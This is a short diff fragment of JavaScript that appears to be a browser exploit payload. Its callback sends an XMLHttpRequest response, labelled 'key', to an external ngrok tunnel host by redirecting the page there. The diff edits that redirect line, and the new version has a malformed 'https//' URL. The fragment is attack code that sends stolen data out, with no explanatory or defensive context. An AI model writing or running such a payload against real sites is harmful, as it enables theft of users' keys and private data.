@@ -6,5 +6,5 @@ xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 xhr.send();
 
 function reqListener() {
-    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
+    location="https//2d7a-140-213-103-229.ngrok-free.app/?key="+this.responseText; 
 };
